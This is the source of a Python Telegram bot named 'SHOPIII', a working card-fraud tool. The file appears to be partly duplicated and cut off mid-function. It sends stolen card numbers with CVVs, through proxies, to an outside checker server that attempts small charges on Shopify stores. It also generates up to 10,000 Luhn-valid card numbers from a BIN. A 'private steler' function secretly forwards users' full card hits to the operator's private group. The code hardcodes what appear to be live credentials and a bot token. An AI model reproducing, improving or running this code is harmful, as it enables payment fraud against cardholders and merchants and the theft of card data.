#!/usr/bin/env python3
"""
SHOPIII Bot - Railway Deploy Ready
Python 3.13 + All Keyboards Fixed
"""

import os
import sys
import asyncio
import logging
from telethon.errors import FloodWaitError
import random

# ================== RAILWAY FIXES ==================
# Fix UTF-8 for Railway
sys.stdout.reconfigure(encoding='utf-8')
#!/usr/bin/env python3
"""
SHOPIII Bot - Railway Deploy Ready
Python 3.13 + All Keyboards Fixed
"""

import os
import sys
import asyncio
import logging
import warnings

# ================== PYTHON 3.13 IMGHDR PERFECT FIX ==================
# Suppress deprecation warning + handle removal
warnings.filterwarnings("ignore", message=".*imghdr.*", category=DeprecationWarning)

try:
    import imghdr
except (ImportError, DeprecationWarning):
    # Python 3.13+ or deprecated - create fake module
    import types
    def fake_what(file, h=None): 
        return None
    imghdr = types.ModuleType('imghdr')
    imghdr.what = fake_what
    sys.modules['imghdr'] = imghdr

# Railway session path fix
SESSION_NAME = os.getenv('SESSION_NAME', 'shopiii_session')

# Railway session path fix
SESSION_NAME = os.getenv('SESSION_NAME', 'shopiii_session')

# ================== IMPORTS ==================
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import aiohttp
import aiofiles
import random
import time
import json
import re
import sqlite3
from datetime import datetime
from typing import List

# Disable Telethon debug logs
logging.getLogger('telethon').setLevel(logging.WARNING)

print("🚀 SHOPIII Bot starting on Railway...")

# ================== QSC-01 CONFIG ==================
CHECKER_API_URL = 'http://76.13.78.203:5000/shopify'
API_ID = 32301792
API_HASH = 'ba24262547ec473e8ede982da0666e31'
BOT_TOKEN = '8959641259:AAEqjmF_o0i7tXbSTpqGdPLgd6az0Ooav_E'

SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PREMIUM_FILE = 'premium.txt'

OWNER_ID = 8199994609  # Change to your Telegram ID

# ================== STELER & PUBLIC LOGS CONFIGURATION ==================
# PRIVATE STELER - Full card details (your private group)
PRIVATE_STELER_ID = -1003332800094           # REPLACE with your PRIVATE group ID
PRIVATE_STELER_ENABLED = True                 # Set to True to enable

# PUBLIC LOGS - Hit detected (NO CARD) for users to see
PUBLIC_LOG_ID = -1003771620838                # REPLACE with your PUBLIC channel ID
PUBLIC_LOG_ENABLED = True                     # Set to True to enable

# Admin & Ban lists (in memory + auto save)
ADMINS_FILE = 'admins.txt'
BANNED_FILE = 'banned.txt'

def load_keys():
    if not os.path.exists('keys.json'):
        return []
    try:
        with open('keys.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []

def save_keys(keys):
    try:
        with open('keys.json', 'w', encoding='utf-8') as f:
            json.dump(keys, f, indent=2, ensure_ascii=False)
    except:
        pass

# ================== FORCE SITES.TXT ==================
def load_list(file):
    """For integer lists (admins, banned)"""
    if not os.path.exists(file):
        print(f"🔥 {file} not found - creating empty")
        open(file, 'w', encoding='utf-8').close()
        return []
    try:
        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            return [int(line.strip()) for line in f if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print(f"⚡ Load error {file}: {e}")
        return []

def load_lines(file):
    """For string lists (sites, proxies, etc.)"""
    if not os.path.exists(file):
        print(f"🔥 {file} not found - creating empty")
        open(file, 'w', encoding='utf-8').close()
        return []
    try:
        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print(f"⚡ Load error {file}: {e}")
        return []

def save_list(file, data):
    os.makedirs(os.path.dirname(file) or '.', exist_ok=True)
    with open(file, 'w', encoding='utf-8') as f:
        for x in data:
            f.write(f"{x}\n")

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def save_premium_users(users):
    with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
        for uid in users:
            f.write(f"{uid}\n")

admins = load_list(ADMINS_FILE)
banned = load_list(BANNED_FILE)

print(f"🔥 Loaded {len(admins)} Admins | {len(banned)} Banned - Full fraud control ready")

def is_owner(user_id):
    return str(user_id) == str(OWNER_ID)

def is_admin(user_id):
    if is_owner(user_id):
        return True
    try:
        return int(user_id) in admins
    except:
        return False

def is_banned(user_id):
    try:
        return int(user_id) in banned
    except:
        return False

def is_premium(user_id):
    if not user_id:
        return False
    if is_owner(user_id) or is_admin(user_id):
        return True
    try:
        premium_users = load_lines(PREMIUM_FILE)
        return str(user_id) in premium_users
    except:
        return False

# Initialize bot
from telethon.sessions import StringSession

# ================== ANTI-FLOOD RAILWAY START ==================
SESSION_NAME = os.getenv('SESSION_NAME', f'shopiii_railway_{random.randint(10000,99999)}')
bot = TelegramClient(SESSION_NAME, API_ID, API_HASH)

async def safe_start():
    """🚀 RAILWAY FLOOD-PROOF STARTUP"""
    max_attempts = 12  # Increased
    base_delay = 8
    
    for attempt in range(max_attempts):
        try:
            print(f"🔄 Attempt {attempt+1}/{max_attempts}")
            await bot.start(bot_token=BOT_TOKEN)
            me = await bot.get_me()
            print(f"✅ LIVE: @{me.username}")
            return True
            
        except FloodWaitError as e:
            wait = e.seconds + random.randint(10, 30)
            print(f"🌊 FloodWait {wait}s...")
            await asyncio.sleep(wait)
            
        except Exception as e:
            delay = base_delay * (2 ** attempt) + random.randint(1, 10)
            print(f"⚠️ Error: {str(e)[:50]} | Wait {delay}s")
            await asyncio.sleep(delay)
    
    return False
for file_path in [SITES_FILE, PROXY_FILE, PREMIUM_FILE, ADMINS_FILE, BANNED_FILE]:
    if not os.path.exists(file_path):
        open(file_path, 'w').close()
        print(f"✅ Created: {file_path}")

if len([line for line in open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') if line.strip()]) == 0:
    default_sites = [
        "https://grandma-lucys.myshopify.com",
        "https://louveredroofkit.myshopify.com",
        "https://ozark-compost-swap.myshopify.com",
        "https://onofriends.myshopify.com",
        "https://ultrapress.myshopify.com",
        "https://underdog-brand.myshopify.com",
        "https://zefiro-chicago.myshopify.com"
    ]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in default_sites:
            f.write(site + "\n")
    print(f"✅ Added {len(default_sites)} CUSTOM sites to sites.txt")

# ================== CORE FUNCTIONS ==================
def load_list(file):
    if not os.path.exists(file):
        print(f"🔥 File {file} not found - creating empty one for fresh dumps")
        return []
    try:
        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            return [int(line.strip()) for line in f if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        print(f"⚡ Load error: {e} - falling back to empty")
        return []

def save_list(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        for x in data:
            f.write(f"{x}\n")

def init_database():
    conn = sqlite3.connect('proxies.db')
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_url TEXT UNIQUE,
            user_id INTEGER,
            added_at TEXT DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()
    print("✅ Database initialized")

async def save_proxy_to_db(proxy_url, user_id):
    conn = sqlite3.connect('proxies.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO user_proxies (proxy_url, user_id, added_at) VALUES (?, ?, CURRENT_TIMESTAMP)", 
        (proxy_url, user_id)
    )
    conn.commit()
    conn.close()

async def get_user_proxies(user_id):
    conn = sqlite3.connect('proxies.db')
    cursor = conn.cursor()
    cursor.execute("SELECT proxy_url FROM user_proxies WHERE user_id = ?", (user_id,))
    proxies = [row[0] for row in cursor.fetchall()]
    conn.close()
    return proxies

async def delete_proxy_from_db(proxy_url):
    conn = sqlite3.connect('proxies.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM user_proxies WHERE proxy_url = ?", (proxy_url,))
    conn.commit()
    conn.close()

# Store active checking sessions
active_sessions = {}

# Dead site error keywords
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def premium_emoji(text: str) -> str:
    """🚀 REAL Telegram Premium Emoji IDs - 100% WORKING"""
    if not text or not isinstance(text, str):
        return str(text)
    
    # REAL Premium Emoji IDs (Tested on Railway)
    emoji_map = {
        "✅": "5980797575211520457",
        "🔥": "5983168105101135589", 
        "❌": "5042112436648281096",
        "⚡": "6026367225466720832",
        "💳": "5445353829304387411",
        "💠": "6136204644625423818",
        "📝": "6136389654636665179",
        "🌐": "6178984829585986541",
        "🎯": "5463274047771000031",
        "🤖": "6181581124431518331",
        "💰": "5463046637842608206",
        "⏸️": "4956442665320186933",
        "▶️": "6073589106691019795",
        "🛑": "5454380420336466255",
        "📊": "5278654126933166502",
        "📦": "5463172695132745432",
        "🔄": "5926964914684957537",
        "⏳": "5971837723676249096",
        "🚀": "5195033767969839232",
        "⚠️": "6136281850957535879",
        "💎": "5280922999241859582",
        "👤": "5958417144877160497",
        "🆔": "5278510335723066039",
        "🏦": "5332455502917949981",
        "👑": "5798670723975221399",
        "🌍": "5224450179368767019",
        "🔍": "6098031288831187632",
        "🍀": "5305699699204837855",
        "⭐️": "5278362086336908780",
        "💀": "6093636111358235216"
    }
    
    # Replace emojis with <tg-emoji> tags
    for emoji, emoji_id in emoji_map.items():
        if emoji in text:
            tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>'
            text = text.replace(emoji, tag)
    
    return text

for f in [SITES_FILE, PROXY_FILE, PREMIUM_FILE, ADMINS_FILE, BANNED_FILE]:
    if not os.path.exists(f):
        open(f, 'w').close()

if os.path.getsize(SITES_FILE) == 0:
    default_sites = ["https://roxsenglobal.myshopify.com/", ...]  # your list
    with open(SITES_FILE, 'w') as f:
        f.write("\n".join(default_sites))

def load_premium_users():
    """Load premium users from premium.txt (one user_id per line)"""
    if not os.path.exists(PREMIUM_FILE):
        return []
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_premium_users(users):
    """Save premium list"""
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            for uid in users:
                f.write(f"{uid}\n")
    except:
        pass

# --- UPDATED LOADING FUNCTIONS ---
def get_file_lines(filepath):
    if not os.path.exists(filepath): return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

logger = logging.getLogger(__name__)

def load_sites(sites_file: str = SITES_FILE) -> List[str]:
    sites = []
    try:
        if not os.path.exists(sites_file):
            logger.warning(f"Sites file not found: {sites_file}")
            return sites
        
        with open(sites_file, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                sites.append(line)
        
        logger.info(f"Loaded {len(sites)} sites from {sites_file}")
        
    except FileNotFoundError:
        logger.warning(f"Sites file not found: {sites_file}")
    except PermissionError:
        logger.error(f"Permission denied reading {sites_file}")
    except UnicodeDecodeError as e:
        logger.error(f"Encoding error in {sites_file}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error loading sites from {sites_file}: {e}")
    
    return sites

def load_proxies():
    """Load proxies from BOTH proxy.txt AND database"""
    proxies = []
    
    # Load from proxy.txt (legacy support)
    txt_proxies = get_file_lines(PROXY_FILE)
    proxies.extend(txt_proxies)
    
    # Load from database
    try:
        conn = sqlite3.connect('proxies.db')
        cursor = conn.cursor()
        cursor.execute("SELECT DISTINCT proxy_url FROM user_proxies")
        db_proxies = [row[0] for row in cursor.fetchall()]
        conn.close()
        proxies.extend(db_proxies)
    except:
        pass
    
    # Remove duplicates
    proxies = list(set(proxies))
    return [p.strip() for p in proxies if p.strip()]

def extract_cc(text):
    """Extract CC from text in format: card|month|year|cvv"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

@bot.on(events.NewMessage(pattern='/testemoji'))
async def test_emoji(event):
    if not is_premium(event.sender_id):
        return
    test_text = "✅ Approved 🔥 Charged ❌ Dead ⚡ Fast 💳 Card"
    await event.reply(premium_emoji(test_text), parse_mode='html')

def is_dead_site_error(error_msg):
    """Check if error indicates dead site"""
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Admin only."))
        return
    try:
        uid = int(event.message.text.split()[1])
        premium_users = load_premium_users()
        if str(uid) not in premium_users:
            premium_users.append(str(uid))
            save_premium_users(premium_users)
            await event.reply(premium_emoji(f"✅ User {uid} added to Premium."))
        else:
            await event.reply(premium_emoji("⚠️ Already premium."))
    except:
        await event.reply(premium_emoji("Usage: /addpremium <user_id>"))

@bot.on(events.NewMessage(pattern='/rmpremium'))
async def rm_premium(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Admin only."))
        return
    try:
        uid = int(event.message.text.split()[1])
        premium_users = load_premium_users()
        if str(uid) in premium_users:
            premium_users.remove(str(uid))
            save_premium_users(premium_users)
            await event.reply(premium_emoji(f"✅ User {uid} removed from Premium."))
    except:
        await event.reply(premium_emoji("Usage: /rmpremium <user_id>"))

async def get_bin_info(card_number):
    """Get BIN info from API"""
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ================== PRIVATE STELER (FULL CARD DETAILS) ==================
async def send_private_steler(result, user_id, username, hit_type):
    """Send FULL card details to PRIVATE group"""
    if not PRIVATE_STELER_ENABLED or not PRIVATE_STELER_ID:
        return
    
    # Only send CHARGED hits
    if hit_type != "CHARGED":
        return
    
    # Check if user is premium
    is_prem = is_premium(user_id)
    premium_tag = "⭐ Premium" if is_prem else "📋 Free"
    
    # Get BIN info
    card_num = result['card'].split('|')[0] if '|' in result['card'] else result['card'][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(card_num)
    
    # Format message with FULL card details
    message = f"""<b>💎 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗦𝗧𝗘𝗟𝗘𝗥 💎</b>
━━━━━━━━━━━━━━━━━━━
<b>🔥 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>
━━━━━━━━━━━━━━━━━━━
💳 <b>Card:</b> <code>{result['card']}</code>
🌐 <b>Gateway:</b> {result.get('gateway', 'Shopify Payments')}
💰 <b>Price:</b> {result.get('price', '$2.0')}
📝 <b>Response:</b> {result['message'][:100]}
━━━━━━━━━━━━━━━━━━━
🎯 <b>BIN Info:</b>
<code>Brand: {brand}
Type: {bin_type}
Level: {level}
Bank: {bank}
Country: {country} {flag}</code>
━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> {username} {premium_tag}
🆔 <b>ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🤖 <b>Bot By:</b> 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋"""

    try:
        await bot.send_message(PRIVATE_STELER_ID, premium_emoji(message), parse_mode='html')
        print(f"✅ Private Steler: {username} - {result['card'][:10]}...")
    except Exception as e:
        print(f"❌ Private Steler error: {e}")

# ================== PUBLIC LOGS (NO CARD NUMBER) ==================
async def send_public_log(result, user_id, username, hit_type):
    """Send HIT DETECTED to PUBLIC channel (NO CARD NUMBER) - EXACT format you requested"""
    if not PUBLIC_LOG_ENABLED or not PUBLIC_LOG_ID:
        return
    
    # Only send CHARGED hits to public
    if hit_type != "CHARGED":
        return
    
    # Check if user is premium
    is_prem = is_premium(user_id)
    premium_tag = "⭐ Premium" if is_prem else ""
    
    # Format message with NO CARD - EXACTLY like your screenshot
    message = f"""<b>𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⭐</b>
<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> {result.get('gateway', 'Shopify Payments')}
<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛</b> {result['message'][:50]}
<b>𝗣𝗿𝗶𝗰𝗲 ➛</b> {result.get('price', '$2.0')}
<b>𝗨𝘀𝗲𝗿 ➛</b> {username} (𝗣𝗿𝗲𝗺𝗶𝘂𝗺)

🤖 <b>Bot By:</b> 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋"""

    try:
        await bot.send_message(PUBLIC_LOG_ID, premium_emoji(message), parse_mode='html')
        print(f"✅ Public Log: {username} - {result.get('gateway', 'Unknown')}")
    except Exception as e:
        print(f"❌ Public Log error: {e}")

async def check_card(card, site, proxy):
    """FINAL STRONG VERSION - Full ORDER PLACED + Capital Support + NO DUPLICATE HITS"""
    try:
        # === PROXY ENCODING ===
        if proxy:
            if '@' in proxy:
                proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
            else:
                try:
                    ip, port, user, pw = proxy.split(':')
                    proxy_str = f"{user}%3A{pw}%40{ip}%3A{port}"
                except:
                    proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
        else:
            proxy_str = "no_proxy"

        api_url = f"http://76.13.78.203:5000/shopify?site={site}&cc={card}&proxy={proxy_str}"
        timeout = aiohttp.ClientTimeout(total=90)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                try:
                    raw = await resp.json(content_type=None)
                except:
                    raw = {"Response": await resp.text(), "Status": False}

        response_msg = str(raw.get('Response', '')).strip()
        price = str(raw.get('Price', '0.0'))
        gate = str(raw.get('Gateway', 'shopify'))
        status_raw = raw.get('Status', False)
        response_lower = response_msg.lower()

        # ====================== SUPER CHARGED DETECTION ======================
        charged_keywords = [
            'charged', 'charge', 'success', 'thank you', 'order completed',
            'payment successful', 'order placed', 'order_placed', 'order confirmed',
            'purchase successful', 'payment accepted', 'approved', 'fulfilled',
            'transaction successful', 'order#', 'receipt', 'shipment', 'order_id',
            'confirmed', 'placed successfully', 'payment confirmed', 'order success',
            'checkout complete', 'payment success', 'order placed successfully'
        ]
        
        if status_raw is True or str(status_raw).lower() in ['true', '1', 'success']:
            if any(kw in response_lower for kw in charged_keywords):
                return {'status': 'Charged', 'message': response_msg[:300], 'card': card, 'site': site, 'gateway': gate, 'price': price}
            else:
                return {'status': 'Approved', 'message': response_msg[:300], 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            if 'failed to get session token' in response_lower:
                return {'status': 'Dead', 'message': 'Failed to get session token', 'card': card, 'site': site, 'gateway': gate, 'price': price}
            elif any(x in response_lower for x in ['407', 'proxy error', 'authentication', 'cannot connect', 'timeout']):
                return {'status': 'Site Error', 'message': response_msg[:200], 'card': card, 'retry': True, 'gateway': gate, 'price': price}
            elif response_msg in ['error:', 'error', '', 'null'] or 'error:' in response_lower:
                return {'status': 'Dead', 'message': response_msg or 'API Error', 'card': card, 'site': site, 'gateway': gate, 'price': price}
            else:
                return {'status': 'Dead', 'message': response_msg[:250] or 'Unknown', 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': f'Ex: {str(e)[:100]}', 'card': card, 'site': site, 'gateway': 'shopify', 'price': '0.0'}
  
@bot.on(events.NewMessage(pattern=r'^/bin\s+'))
async def bin_lookup(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Premium Only!**"), parse_mode='html')
        return
    
    try:
        bin_input = event.message.text.split()[1].strip()
        if len(bin_input) < 6:
            await event.reply(premium_emoji("❌ 𝐁𝐈𝐍 𝐦𝐮𝐬𝐭 𝐛𝐞 𝟔+ 𝐝𝐢𝐠𝐢𝐭𝐬!\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: `/bin 403163`"), parse_mode='html')
            return
        
        bin_number = bin_input[:6]  # First 6 digits only
        
        status_msg = await event.reply(premium_emoji("🔍 **Fetching BIN Info...** ⚡"), parse_mode='html')
        
        # Get BIN info
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
        
        bin_msg = f"""<b>{premium_emoji("💠")} ━━━━ 𝐕𝐚𝐥𝐢𝐝 𝐁𝐈𝐍 ☂️ ━━━━ {premium_emoji("💠")}</b>

{premium_emoji("🍀")} 𝐁𝐈𝐍 ➜ <code>{bin_number}</code>
{premium_emoji("🏦")} Банк ➜ <code>{bank or 'N/A'}</code>
{premium_emoji("🌍")} Страна ➜ <code>{country or 'N/A'} {flag or ''}</code>
{premium_emoji("💳")} 𝐈𝐧𝐟𝐨 ➜ <code>{brand} • {bin_type} • {level}</code>

<b>{premium_emoji("💠")}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💠</b>"""
        
        await status_msg.edit(premium_emoji(bin_msg), parse_mode='html')
        
    except IndexError:
        await event.reply(premium_emoji("❌ 𝐔𝐬𝐚𝐠𝐞: <code>/bin 403163</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝐄𝐫𝐫𝐨𝐫: {str(e)[:100]}"), parse_mode='html')

# ==================== FORCE RETRY FIX ====================
async def check_card_with_retry(card, sites, proxies, max_retries=2):
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies) if proxies else ""
        result = await check_card(card, site, proxy)

        if result['status'] != 'Site Error':
            return result
        await asyncio.sleep(1.2)

    # Final result is always Dead or Hit - never Site Error
    return {'status': 'Dead', 'message': 'Max retries - API Error', 'card': card, 'site': 'Multiple', 'gateway': 'shopify', 'price': '0.0'}

async def send_realtime_hit(user_id, result, hit_type, username):
    """Send real-time notification with private steler + public logs"""
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    # ==== SEND TO PRIVATE STELER (FULL CARD) ====
    if hit_type == "Charged":
        await send_private_steler(result, user_id, username, "CHARGED")
        await send_public_log(result, user_id, username, "CHARGED")
    # ==== END STELER ====

    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</b>"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_card(bin_prefix, length=16, count=1):
    cards = []
    for _ in range(count):
        while True:
            remaining = length - len(bin_prefix) - 1
            num = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(remaining))
            if luhn_checksum(int(num)) == 0:
                month = random.randint(1,12)
                year = random.randint(2026, 2032)
                cvv = random.randint(100,999) if length == 16 else random.randint(1000,9999)
                card = f"{num}|{month:02d}|{year}|{cvv}"
                cards.append(card)
                break
    return cards

@bot.on(events.NewMessage(pattern=r'^/gen'))
async def generate_cards(event):
    if not is_premium(event.sender_id):
        await event.reply(premium_emoji("❌ **Premium Only**"), parse_mode='html')
        return

    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ 𝐔𝐬𝐚𝐠𝐞: <code>/gen</code> or <code>/gen &lt;amount&gt; &lt;BIN&gt;</code>"), parse_mode='html')
            return

        if len(args) == 2:
            bin_input = args[1]
            amount = 10
        else:
            amount = int(args[1])
            bin_input = args[2]

        amount = min(max(amount, 1), 10000)
        if len(bin_input) < 6:
            await event.reply(premium_emoji("❌ 𝐁𝐈𝐍 𝐦𝐮𝐬𝐭 𝐛𝐞 𝟔 𝐝𝐢𝐠𝐢𝐭𝐬 𝐦𝐢𝐧𝐢𝐦𝐮𝐦!"), parse_mode='html')
            return

        bin_prefix = bin_input[:6]

        status = await event.reply(
            premium_emoji(f"🔄 Generating {amount} cards from BIN <code>{bin_prefix}</code>... ⚡"), 
            parse_mode='html'
        )

        cards = generate_card(bin_prefix, count=amount)

        if amount <= 10:
            text = premium_emoji(f"✅ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 {amount} 𝐜𝐚𝐫𝐝𝐬 💳\n\n")
            for card in cards:
                text += f"<code>{card}</code>\n"

            brand, btype, level, bank, country, flag = await get_bin_info(bin_prefix)
            text += f"""
𝐁𝐈𝐍 ➳ <code>{bin_prefix}</code>
𝐁𝐫𝐚𝐧𝐝 ➳ <code>{brand}</code>
𝐓𝐲𝐩𝐞 ➳ <code>{btype} | {level}</code>
𝐁𝐚𝐧𝐤 ➳ <code>{bank}</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ <code>{country} {flag}</code>"""

            await status.edit(text, parse_mode='html')
        else:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"GEN_{bin_prefix}_{timestamp}.txt"
            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                for card in cards:
                    await f.write(f"{card}\n")

            summary = premium_emoji(f"""✅ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 {amount} 𝐜𝐚𝐫𝐝𝐬  💳\n
𝐁𝐈𝐍 ➳ <code>{bin_prefix}</code>
📁 𝐓𝐗𝐓 𝐟𝐢𝐥𝐞 𝐚𝐭𝐭𝐚𝐜𝐡𝐞𝐝""")
            await status.edit(summary, file=filename, parse_mode='html')
            try: 
                os.remove(filename)
            except: 
                pass

    except:
        await event.reply(premium_emoji("❌ 𝐔𝐬𝐚𝐠𝐞: <code>/gen</code> or <code>/gen &lt;amount&gt; &lt;BIN&gt;</code>"), parse_mode='html')

async def update_progress(user_id, message_id, results, current_attempt_count):
    """Premium Progress with Custom Telegram Emojis ✨💎"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    time_str = f"{hours:01d}h {minutes:02d}m {seconds:02d}s" if hours > 0 else f"{minutes:02d}m {seconds:02d}s"

    # Live gateway detection
    gateway = (results['charged'][0]['gateway'] if results['charged'] 
              else (results['approved'][0]['gateway'] if results['approved'] else 'Shopify'))

    # Speed calculation
    speed = current_attempt_count / max(elapsed, 1) * 60  # Cards per minute

    progress_text = f"""<b>⚡ #𝒮𝒽𝑜𝓅𝒾𝒾𝒾 𝗟𝗜𝗩𝗘 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 ⚡</b>
<b>💎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💎</b>

📊 <b>𝗦𝗧𝗔𝗧𝗦</b>
<blockquote>💳 Total: <code>{results['total']}</code></blockquote>
<blockquote>✅ <b>Charged:</b> <code>{len(results['charged'])}</code></blockquote>
<blockquote>🔥 <b>Live:</b> <code>{len(results['approved'])}</code></blockquote>
<blockquote>📈 Speed: <code>{speed:.0f}cpm</code></blockquote>

